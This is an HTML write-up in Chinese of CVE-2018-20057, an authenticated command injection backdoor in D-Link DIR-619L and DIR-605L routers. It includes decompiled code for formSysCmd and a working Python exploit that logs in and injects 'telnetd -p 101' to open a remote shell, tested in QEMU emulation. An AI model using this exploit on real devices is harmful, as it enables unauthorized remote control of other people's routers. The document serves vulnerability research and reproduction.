<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X824b7f550a8b990c5b63d61fcad99d87d8b8b77"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-20057</span><span class="csECDA2D3">）</span><span class="csDE05BCC">D-Link DIR-619L&amp;605L </span><span class="csECDA2D3">命令注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-LINK</span><span class="cs9C1B1871">的</span><span class="cs8926E06">DIR-619L Rev.B 2.06B1</span><span class="cs9C1B1871">版本之前和</span><span class="cs8926E06">DIR-605L Rev.B 2.12B1</span><span class="cs9C1B1871">版本之前的设备，在</span><span class="cs8926E06">/bin/boa</span><span class="cs9C1B1871">文件的</span><span class="cs8926E06">formSysCmd</span><span class="cs9C1B1871">函数存在后门，导致攻击者在身份认证后可以通过访问</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://[ip]//goform/formSysCmd</span><span class="cs7FFD2630">并指定</span><span class="cs9FB05234">sysCmd</span><span class="cs7FFD2630">参数，从而实现远程命令注入。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">固件下载地址：</span><span class="cs8926E06">ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">本漏洞的路由器运行环境与</span><span class="cs8926E06">CVE-2018-20056</span><span class="cs9C1B1871">相同。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-LINK</span><span class="cs9C1B1871">的</span><span class="cs8926E06">DIR-619L Rev.B 2.06B1</span><span class="cs9C1B1871">版本之前和</span><span class="cs8926E06">DIR-605L Rev.B 2.12B1</span><span class="cs9C1B1871">版本之前的设备。</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">查看</span><span class="cs8926E06">ghidra</span><span class="cs9C1B1871">中的反编译代码，在</span><span class="cs8926E06">formSysCmd</span><span class="cs9C1B1871">中，首先获取</span><span class="cs8926E06">sysCmd</span><span class="cs9C1B1871">参数，然后通过</span><span class="cs8926E06">snprintf</span><span class="cs9C1B1871">写入栈中变量，直接调用</span><span class="cs8926E06">system</span><span class="cs9C1B1871">函数执行该参数内容。</span></p><p class="cs3A447A38"><span class="cs9FB05234">void formSysCmd(undefined4 uParm1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;undefined4 uVar1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char *pcVar2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;char acStack120 [104];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;uVar1 = websGetVar(uParm1,&quot;submit-url&quot;,&amp;DAT_004ac874);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;//</span><span class="cs7FFD2630">获取</span><span class="cs9FB05234">post</span><span class="cs7FFD2630">参数</span><span class="cs9FB05234">sysCmd</span><span class="cs7FFD2630">，该参数可由用户控制</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;pcVar2 = (char *)websGetVar(uParm1,&quot;sysCmd&quot;,&amp;DAT_004ac874);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (*pcVar2 != 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">将</span><span class="cs9FB05234">sysCmd</span><span class="cs7FFD2630">写入栈中，并调用</span><span class="cs9FB05234">system</span><span class="cs7FFD2630">执行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;snprintf(acStack120,100,&quot;%s 2&gt;&amp;1 &gt; %s&quot;,pcVar2,&quot;/tmp/syscmd.log&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;system(acStack120);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;websRedirect(uParm1,uVar1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">该漏洞是在身份认证成功之后才可实现命令注入，需要先登录输入用户名和口令。由于是在</span><span class="cs8926E06">qemu</span><span class="cs9C1B1871">中模拟固件，通过</span><span class="cs8926E06">apmib_get</span><span class="cs9C1B1871">读取路由器本地配置无法实现，所以在劫持了</span><span class="cs8926E06">apmib_get</span><span class="cs9C1B1871">函数之后，</span><span class="cs8926E06">login</span><span class="cs9C1B1871">输入的用户名和密码暂时填为空。在真机上操作时，换成真实的用户名和密码即可。</span></p><p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from pwn import *</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">context(arch=&#39;mips&#39;,endian=&#39;big&#39;,log_level=&#39;debug&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">ip=&#39;192.168.84.129&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">port=101</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def login(user,password):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;postData = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;login_name&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;curTime&#39;:&#39;1234&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;FILECODE&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;VER_CODE&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;VERIFICATION_CODE&#39;:&#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;login_n&#39;:user,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;login_pass&#39;:base64.b64encode(password),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response = requests.post(&#39;http://&#39;+ip+&#39;/goform/formLogin&#39;,data=postData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#print response.url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def syscmd(cmd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;postData = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;sysCmd&#39;:cmd,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;submit-url&#39;:&#39;1234&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response = requests.post(&#39;http://&#39;+ip+&#39;/goform/formSysCmd&#39;,data=postData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#print response.url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def inter():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p=remote(ip,port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;p.interactive()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login(&#39;&#39;,&#39;&#39;)#</span><span class="cs7FFD2630">这里要写实际的用户名和密码，例如</span><span class="cs9FB05234">admin 12345</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;syscmd(&#39;telnetd -p &#39;+str(port))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;inter()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另由于</span><span class="cs8926E06">qemu</span><span class="cs9C1B1871">模拟时，</span><span class="cs8926E06">/dev</span><span class="cs9C1B1871">下没有</span><span class="cs8926E06">pty</span><span class="cs9C1B1871">设备，导致</span><span class="cs8926E06">telnet</span><span class="cs9C1B1871">连接不能实现，但是端口是已经打开了：</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2018-20057%ef%bc%89D-Link%20DIR-619L&605L%20%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="89" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
</html>
